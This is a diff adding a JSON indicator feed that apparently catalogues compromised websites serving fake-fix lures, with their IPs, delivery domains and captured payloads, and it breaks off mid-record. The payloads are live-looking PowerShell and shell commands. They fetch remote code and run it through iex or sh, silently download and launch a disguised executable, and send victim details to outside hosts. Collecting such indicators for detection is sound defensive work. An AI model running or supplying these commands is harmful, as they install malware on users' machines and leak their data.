@@ -1,0 +1,2721 @@
+[
+  {
+    "UrlDomain": "sincereartgallery.com",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "94.199.206.84"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwbcozau05b40nmlpvqndtvc"
+  },
+  {
+    "UrlDomain": "modowo-butik.pl",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN",
+      "https://modowo-butik.pl/"
+    ],
+    "IP": [
+      "77.37.53.44"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwbcctj1054w0nmldy5ok48q"
+  },
+  {
+    "UrlDomain": "providencemedsupply.com",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "148.135.129.88"
+    ],
+    "Related": [
+      {
+        "Value": "https://frclau.com/ca.js",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwbc2sy1051a0nmlped5obiu"
+  },
+  {
+    "UrlDomain": "www.rubencabanillas.site",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.66.41.41"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/c6faa4c82ba7c265",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/c6faa4c82ba7c265'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/c6faa4c82ba7c265"
+    ],
+    "ReportId": "cmwbbwwnu04xv0nmldbt2utkz"
+  },
+  {
+    "UrlDomain": "greggmenu.co.uk",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN",
+      "https://www.opera.com/gx?utm_source=PWNgames&utm_medium=pa&utm_campaign=PWN_NL_SVR_8875_OOM_5542&utm_id=1c57a14951674f70800221494d8f4515&edition=std-2"
+    ],
+    "IP": [
+      "77.37.53.118"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwbbh8q704q80nmlzetfk82h"
+  },
+  {
+    "UrlDomain": "cyclecamper.eu",
+    "DeliveryUrl": [
+      "sky.dolcefantasia.us",
+      "t-trustresnew.com"
+    ],
+    "PayloadUrl": [
+      "https://t-trustresnew.com/wp/2b9b641bfb4bd784"
+    ],
+    "IP": [
+      "80.69.67.40"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://t-trustresnew[.]com/wp/2b9b641bfb4bd784')|iex",
+    "ResolvedDownloadUrl": [
+      "https://t-trustresnew.com/wp/2b9b641bfb4bd784"
+    ],
+    "ReportId": "cmwbajp3r04aa0nmljuneis7c"
+  },
+  {
+    "UrlDomain": "kowloonindustries.org",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.108.98.92"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/24420ba29a6a9584",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29905846",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/24420ba29a6a9584'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/24420ba29a6a9584"
+    ],
+    "ReportId": "cmwba5cu3044c0nml3nqe0h2d"
+  },
+  {
+    "UrlDomain": "bhumivista.com",
+    "DeliveryUrl": [
+      "makeverizyjar.info",
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "77.37.53.31"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwba4v2m03zy0nmlqkjqqbz3"
+  },
+  {
+    "UrlDomain": "www.tune-web.de",
+    "DeliveryUrl": [
+      "japlukarmore.org",
+      "cosmical2049.com"
+    ],
+    "PayloadUrl": [
+      "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
+    ],
+    "IP": [
+      "185.194.237.152"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://cosmical2049[.]com/lom3/0ad7a0bdad0aa13d' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex",
+    "ResolvedDownloadUrl": [
+      "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
+    ],
+    "ReportId": "cmwba4rrn03zm0nmlk0p8nr3q"
+  },
+  {
+    "UrlDomain": "monkeydigital.asia",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.53.176"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/2073c44b65a026f7",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/2073c44b65a026f7'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/2073c44b65a026f7"
+    ],
+    "ReportId": "cmwba4l9w03wq0nmlj3tbht42"
+  },
+  {
+    "UrlDomain": "afilma.net",
+    "DeliveryUrl": [
+      "lovezramexar.info",
+      "makeverizyjar.info",
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "134.0.15.187"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwb9uqk303s00nmluopqulrr"
+  },
+  {
+    "UrlDomain": "towinginculvercity.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "93.127.179.80"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/258af50be7f8070a",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=6d61d3c4f0ecf193c89fbb37ccc86999b416c0289e00584d&amp;_v=29905837",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/258af50be7f8070a'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/258af50be7f8070a"
+    ],
+    "ReportId": "cmwb9tlb703qm0nmlt6pchmzd"
+  },
+  {
+    "UrlDomain": "orkids.in",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "62.72.28.199"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/d7125fe2b22df9e3",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=e5a6ee8789a37b46424f0e1a414979a3e9c4b670f991f82c&amp;_v=29905836",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/d7125fe2b22df9e3'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/d7125fe2b22df9e3"
+    ],
+    "ReportId": "cmwb9svdt03n50nmldedzui3w"
+  },
+  {
+    "UrlDomain": "www.evebeauty.pl",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "194.181.228.15"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
+    ],
+    "ReportId": "cmwb9sv2b03n30nmlg7631ln8"
+  },
+  {
+    "UrlDomain": "everypuns.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "86.38.202.83"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/036cf7940c1ef98c",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=cdd18bdc133f96ea52b911255124110acaaa1da15c2c41cf&amp;_v=29905836",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/036cf7940c1ef98c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/036cf7940c1ef98c"
+    ],
+    "ReportId": "cmwb9s7fv03lb0nml26lpkdda"
+  },
+  {
+    "UrlDomain": "kulinar.az",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.108.98.193"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/c5cf65129f21d5ef",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/c5cf65129f21d5ef'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/c5cf65129f21d5ef"
+    ],
+    "ReportId": "cmwb9rikl03ju0nmlttlv4mut"
+  },
+  {
+    "UrlDomain": "gownsonline.co.za",
+    "DeliveryUrl": [
+      "t-trustresnew.com"
+    ],
+    "PayloadUrl": [
+      "https://t-trustresnew.com/wp/ea91ecfa8614d564"
+    ],
+    "IP": [
+      "196.40.97.167"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://t-trustresnew[.]com/wp/ea91ecfa8614d564')|iex",
+    "ResolvedDownloadUrl": [
+      "https://t-trustresnew.com/wp/ea91ecfa8614d564"
+    ],
+    "ReportId": "cmwb9iguz037i0nmldasfla69"
+  },
+  {
+    "UrlDomain": "www.milanbike.it",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer",
+      "gfisoda.biz"
+    ],
+    "PayloadUrl": [
+      "https://gfisoda.biz/clickfix/8e15947cbef29c2d"
+    ],
+    "IP": [
+      "89.46.108.60"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex",
+    "ResolvedDownloadUrl": [
+      "https://gfisoda.biz/clickfix/8e15947cbef29c2d"
+    ],
+    "ReportId": "cmwb9h38w036h0nmld2sxsius"
+  },
+  {
+    "UrlDomain": "ecommerce.strongsystemsltd.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "88.222.220.8"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/9c0439ed84126f3c",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905825",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/9c0439ed84126f3c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/9c0439ed84126f3c"
+    ],
+    "ReportId": "cmwb9fos2035g0nmlf8w89z61"
+  },
+  {
+    "UrlDomain": "www.hfcberlin.de",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.137.168.153"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/349d377a86282d44",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=add3164684f61d651fbec01a02f605ce6eb0fcb89f2a5c9a&amp;_v=29905825",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/349d377a86282d44'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/349d377a86282d44"
+    ],
+    "ReportId": "cmwb9eci903430nmln3emnam9"
+  },
+  {
+    "UrlDomain": "namhuzz.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "86.38.202.83"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/de1cc1e870ff2e58",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=cdd18bdc133f96ea52b911255124110acaaa1da15c2c41cf&amp;_v=29905824",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/de1cc1e870ff2e58'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/de1cc1e870ff2e58"
+    ],
+    "ReportId": "cmwb9di8i031b0nml3396b8w2"
+  },
+  {
+    "UrlDomain": "realblessingpro.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "86.38.202.83"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/3740293579daa833",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=cdd18bdc133f96ea52b911255124110acaaa1da15c2c41cf&amp;_v=29905824",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/3740293579daa833'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/3740293579daa833"
+    ],
+    "ReportId": "cmwb9cvmr02ye0nmlznmtl5fi"
+  },
+  {
+    "UrlDomain": "www.italiandreamholidays.it",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "46.254.34.98"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/ccee3ed87c8109ea",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=fd31a7ad950e56856e09dcb32f0fc58caec1ad7da5c91b0a&amp;_v=29905824",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/ccee3ed87c8109ea'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/ccee3ed87c8109ea"
+    ],
+    "ReportId": "cmwb9cvig02yd0nmlp4ntzvx7"
+  },
+  {
+    "UrlDomain": "www.renatusventures.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "75.119.205.130"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/2b7be24f0fb055c2",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=d337fe5678dbf1893653249a44964fe325f0428d2f4be1ae&amp;_v=29905823",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/2b7be24f0fb055c2'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/2b7be24f0fb055c2"
+    ],
+    "ReportId": "cmwb9c52002x40nmlksski1kl"
+  },
+  {
+    "UrlDomain": "avalonii.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "172.67.206.124"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/1ce85935d5e8d060",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905816",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/1ce85935d5e8d060'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/1ce85935d5e8d060"
+    ],
+    "ReportId": "cmwb9279u02tr0nmlgvl60god"
+  },
+  {
+    "UrlDomain": "agrimetal.com.br",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.2.253"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/07684D2-7E68-43a4-B972-7b11871881A1 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/07684D2-7E68-43a4-B972-7b11871881A1"
+    ],
+    "ReportId": "cmwb91njo02sr0nmlwel41mzg"
+  },
+  {
+    "UrlDomain": "www.goldlaminates.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "95.216.158.63"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/0bb98601c2aaf567",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/0bb98601c2aaf567'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/0bb98601c2aaf567"
+    ],
+    "ReportId": "cmwb8yk2r02qr0nml91osidzz"
+  },
+  {
+    "UrlDomain": "affordableindividualhealthcare.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "170.249.238.89"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/07684D2-7E68-43a4-B972-7b11871881A1 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/07684D2-7E68-43a4-B972-7b11871881A1"
+    ],
+    "ReportId": "cmwb8wr3l02pc0nmlnxps66he"
+  },
+  {
+    "UrlDomain": "notorioushoodlum.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "50.87.177.120"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/69845b449b7231eb",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://amber-moss-stulmgrao.pro/t.js?site=bd6f1b7fb927cdd0e1b9446b1b621b67",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905804",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/69845b449b7231eb'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/69845b449b7231eb"
+    ],
+    "ReportId": "cmwb8o25z02l10nmliewjfv3s"
+  },
+  {
+    "UrlDomain": "filtrosandre.com.pe",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "201.148.105.118"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/2efb6f6a92b0c99d",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/2efb6f6a92b0c99d'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/2efb6f6a92b0c99d"
+    ],
+    "ReportId": "cmwb7wv4o028q0nmlm68perwn"
+  },
+  {
+    "UrlDomain": "experimentfives.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer",
+      "script.google.com",
+      "script-six-tawny.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/win",
+      "https://script-six-tawny.vercel.app/mac"
+    ],
+    "IP": [
+      "82.180.172.64"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=a0a866b2-7d0f-4965-a279-7ea3cee721e1&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fexperimentfives[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-10T21%3A41%3A43.628Z&lastShellAt=2026-11-10T21%3A41%3A43.628Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmwb7v7i1025t0nml5t0xcclk"
+  },
+  {
+    "UrlDomain": "9thstreetycc.org",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer",
+      "script.google.com",
+      "script-six-tawny.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/win",
+      "https://script-six-tawny.vercel.app/mac"
+    ],
+    "IP": [
+      "65.254.248.96"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=1ba468db-fb84-4201-9b02-7eafec91aaf8&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2F9thstreetycc[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-10T21%3A38%3A45.867Z&lastShellAt=2026-11-10T21%3A38%3A45.867Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmwb7rf82021p0nmli0ofq41p"
+  },
+  {
+    "UrlDomain": "fashionmaniablog.online",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.108.98.22"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/77ec859b6ca732cb",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/77ec859b6ca732cb'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/77ec859b6ca732cb"
+    ],
+    "ReportId": "cmwb7pen201zu0nmlsoa57b4g"
+  },
+  {
+    "UrlDomain": "fandmhvacservices.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "93.127.179.96"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/28b87eaada92b942",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/28b87eaada92b942'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/28b87eaada92b942"
+    ],
+    "ReportId": "cmwb7lvml01y50nml49vrt35d"
+  },
+  {
+    "UrlDomain": "flooringexpert.ae",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.108.98.49"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/c6275247a1e042eb",
+        "Type": "payload download"
+      }
+    ],
